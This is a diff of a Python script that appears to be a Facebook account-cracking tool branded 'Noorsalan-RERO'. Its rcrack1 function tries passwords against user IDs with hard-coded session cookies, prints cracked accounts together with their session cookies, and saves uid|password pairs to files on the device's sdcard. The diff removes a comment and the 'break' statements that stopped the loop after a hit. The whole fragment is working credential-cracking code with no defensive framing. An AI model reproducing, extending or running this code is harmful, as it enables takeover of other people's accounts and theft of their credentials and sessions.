@@ -175,7 +175,6 @@ def rcrack1(uid,pwx,tl):
             cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
             sys.stdout.write(f'\r \033[1;90m[\33[1;92mNoorsalan-RERO\033[1;90m]\x1b[1;96m-\033[1;90m[{cl}{loop}\033[1;90m]\x1b[1;96m-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
             
-            # Integrated cookies and headers provided
             cookies = {
                 'datr': 'H4aEakE2BpdsQ7MYmJw3h9dC',
                 'sb': 'H4aEauGKc330Ki2ejzrq5Uk6',
@@ -227,14 +226,12 @@ def rcrack1(uid,pwx,tl):
                 print(f"\033[38;5;46m=[Noorsalan-OK💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
                 open('/sdcard/Noorsalan-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
-                break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
                 print(f"\x1b[38;5;196m=[Noorsalan-LK💔]= {uid}|{ps}")
                 open('/sdcard/Noorsalan-LK.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
-                break
             else:
                 continue
         loop+=1
